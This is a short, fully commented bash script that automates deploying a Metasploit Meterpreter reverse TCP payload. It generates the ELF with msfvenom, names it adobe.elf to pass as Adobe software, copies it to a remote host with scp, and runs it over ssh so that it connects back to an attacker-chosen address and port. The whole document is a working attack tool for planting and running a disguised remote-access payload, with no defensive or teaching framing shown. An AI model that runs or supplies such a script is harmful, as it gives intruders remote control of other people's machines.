#!/bin/bash

# Prompt the user for the IP address to be used for reverse connection (LHOST)
read -p "Enter LHOST: " LHOST
# Prompt the user for the port to be used for reverse connection (LPORT)
read -p "Enter LPORT: " LPORT

# Generate a Meterpreter payload for a reverse TCP connection using msfvenom
# The payload will connect back to the specified LHOST and LPORT
# The payload is an ELF binary (to be run on a Linux target) and is saved to the file adobe.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o adobe.elf

# Prompt the user for the SSH username
read -p "Enter SSH username: " user
# Prompt the user for the SSH server address
read -p "Enter SSH host: " host
# Prompt the user for the path on the SSH server where the payload will be uploaded
read -p "Enter SSH upload path: " path

# Use scp to upload the payload to the specified location on the SSH server
# The payload is saved with the same name (adobe.elf)
scp adobe.elf $user@$host:$path

# Use ssh to log in to the SSH server and execute the payload
# The -tt option is used to force pseudo-terminal allocation
# This can be used to execute arbitrary screen-based programs on a remote machine
# The chmod +x command makes the payload executable
# The payload is then executed
# After the payload is executed, a new bash shell is started to keep the SSH session open
ssh -tt $user@$host "chmod +x $path/adobe.elf; $path/adobe.elf; bash"

# End of script
exit 0
